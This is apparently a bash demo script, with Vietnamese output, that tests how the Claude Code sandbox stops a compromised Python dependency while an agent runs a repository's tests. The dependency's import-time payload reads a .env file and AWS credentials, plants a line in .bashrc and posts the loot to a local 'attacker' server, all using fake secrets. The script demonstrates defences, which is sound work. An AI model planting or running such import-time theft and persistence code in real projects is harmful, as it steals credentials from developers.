#!/usr/bin/env bash
# Claude Code sandbox demo: the same "run the tests" task, three times, with a compromised dependency.
# Every secret is fake and lives under $ROOT; the "attacker" is a local server on 127.0.0.1.
# Usage: bash run-demo.sh [off|default|credentials|all]
set -u
ROOT="$HOME/sandbox-demo-claude"
LOGS="$(pwd)/logs"
PORT=8099
PROMPT='Chạy test của repo này bằng `python3 -m unittest -q` rồi báo kết quả thật ngắn gọn.'

for cmd in claude python3; do
  command -v "$cmd" >/dev/null || { echo "Thiếu lệnh: $cmd"; exit 1; }
done

reset_env() {
  rm -rf "$ROOT"
  mkdir -p "$ROOT/repo/fastcalc" "$ROOT/fake-home/.aws"
  cat > "$ROOT/repo/README.md" <<'EOF'
# shop-api
Small demo service. Run tests with `python3 -m unittest -q`.
EOF
  cat > "$ROOT/repo/calc.py" <<'EOF'
import fastcalc

def total(prices):
    return fastcalc.fsum(prices)
EOF
  cat > "$ROOT/repo/test_calc.py" <<'EOF'
import unittest
from calc import total

class TotalTest(unittest.TestCase):
    def test_total(self):
        self.assertEqual(total([1, 2, 3]), 6)
EOF
  # Stands in for a compromised dependency: importing it runs the payload.
  cat > "$ROOT/repo/fastcalc/__init__.py" <<'EOF'
import os, sys, urllib.request

def fsum(xs):
    return sum(xs)

# DEMO PAYLOAD: prints each attempt so the audience can see what the sandbox allowed.
_repo = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_home = os.path.join(os.path.dirname(_repo), "fake-home")
_loot = []

def _say(ok, what, detail):
    tag = "\033[1;31m✗ LỌT\033[0m    " if ok else "\033[1;32m✓ BỊ CHẶN\033[0m"
    print(f"[fastcalc] {tag} {what}: {detail}", file=sys.stderr)

def _read(label, path):
    try:
        data = open(path).read()
        _loot.append(data)
        _say(True, label, data.splitlines()[-1])
    except OSError as e:
        _say(False, label, e.strerror)

_read("đọc .env trong repo", os.path.join(_repo, ".env"))
_read("đọc ~/.aws/credentials", os.path.join(_home, ".aws", "credentials"))
try:
    with open(os.path.join(_home, ".bashrc"), "a") as f:
        f.write("# planted-by-demo\n")
    _say(True, "ghi ~/.bashrc", "đã cài persistence")
except OSError as e:
    _say(False, "ghi ~/.bashrc", e.strerror)
try:
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    opener.open("http://127.0.0.1:8099/collect", data="".join(_loot).encode() or b"(empty)", timeout=5)
    _say(True, "gửi dữ liệu ra ngoài", f"{sum(map(len, _loot))} byte")
except Exception as e:
    _say(False, "gửi dữ liệu ra ngoài", getattr(e, "reason", e))
EOF
  printf 'STRIPE_SECRET_KEY=FAKE_DEMO_ONLY_stripe_key\n' > "$ROOT/repo/.env"
  printf '[default]\naws_access_key_id = FAKE_DEMO_ONLY_access_key\naws_secret_access_key = FAKE_DEMO_ONLY_secret_key\n' > "$ROOT/fake-home/.aws/credentials"
  printf "export PS1='dev@laptop:\\\\w\$ '\n" > "$ROOT/fake-home/.bashrc"
}

start_attacker() {
  python3 - "$PORT" "$1" <<'EOF' &
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
port, log = int(sys.argv[1]), sys.argv[2]
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode("utf-8", "replace")
        with open(log, "a") as f:
            f.write(body)
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(("127.0.0.1", port), H).serve_forever()
EOF
  ATTACKER_PID=$!
  sleep 0.5
}

settings_for() {
  case "$1" in
    off) ;;
    default) cat <<'EOF'
{
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": false,
    "failIfUnavailable": true
  }
}
EOF
    ;;
    credentials) cat <<EOF
{
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": false,
    "failIfUnavailable": true,
    "credentials": {
      "files": [
        { "path": "$ROOT/fake-home/.aws", "mode": "deny" },
        { "path": "$ROOT/repo/.env", "mode": "deny" }
      ]
    }
  }
}
EOF
    ;;
  esac
}

# Prints what the agent ran, what came back, and its answer from the stream-json log.
show_run() {
  python3 - "$1" <<'EOF'
import json, sys
for line in open(sys.argv[1], encoding="utf-8"):
    try:
        m = json.loads(line)
    except ValueError:
        continue
    for c in (m.get("message") or {}).get("content") or []:
        if not isinstance(c, dict):
            continue
        if c.get("type") == "tool_use":
            print(f"\n● Bash({c['input'].get('command')})")
        elif c.get("type") == "tool_result":
            body = c["content"]
            if isinstance(body, list):
                body = "\n".join(x.get("text", "") for x in body)
            print("  " + str(body).strip().replace("\n", "\n  "))
    if m.get("type") == "result":
        print("\n● " + m.get("result", "").strip())
EOF
}

run_case() {
  local name="$1" settings
  settings="$(settings_for "$name")"
  reset_env
  mkdir -p "$LOGS"
  printf '\n\033[1;36m════════ Lần chạy: %s ════════\033[0m\n' "$name"
  if [ -n "$settings" ]; then
    mkdir -p "$ROOT/repo/.claude"
    printf '%s\n' "$settings" > "$ROOT/repo/.claude/settings.json"
    echo "repo/.claude/settings.json:"; cat "$ROOT/repo/.claude/settings.json"
  else
    echo "Không có .claude/settings.json: sandbox tắt."
  fi
  : > "$LOGS/$name.attacker.log"
  start_attacker "$LOGS/$name.attacker.log"
  (cd "$ROOT/repo" && claude -p "$PROMPT" --allowedTools Bash \
      --output-format stream-json --verbose > "$LOGS/$name.jsonl")
  kill "$ATTACKER_PID" 2>/dev/null; wait "$ATTACKER_PID" 2>/dev/null
  show_run "$LOGS/$name.jsonl"
  echo
  echo "Máy kẻ tấn công nhận được: $(wc -c < "$LOGS/$name.attacker.log") byte"
  grep -q planted-by-demo "$ROOT/fake-home/.bashrc" && echo "~/.bashrc giả: ĐÃ bị ghi thêm dòng persistence" \
    || echo "~/.bashrc giả: không bị sửa"
}

case "${1:-all}" in
  off|default|credentials) run_case "$1" ;;
  all) run_case off; run_case default; run_case credentials ;;
  *) echo "Dùng: bash run-demo.sh [off|default|credentials|all]"; exit 1 ;;
esac
rm -rf "$ROOT"
